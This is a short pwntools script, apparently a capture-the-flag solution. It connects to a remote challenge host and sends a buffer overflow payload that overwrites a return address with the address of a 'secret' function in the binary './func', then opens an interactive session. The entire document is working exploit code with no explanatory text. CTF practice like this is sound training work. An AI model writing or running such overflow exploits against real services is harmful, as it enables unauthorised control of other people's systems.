from pwn import *

elf = ELF('./func')
# p = process('./func')
p = remote("rev.danissimurr.ru", 1338)


payload = b'A' * 16 + p64(elf.sym['secret'])

print(hex(elf.sym['secret']))
p.sendline(payload)
print(p.recvall().decode())

p.interactive()
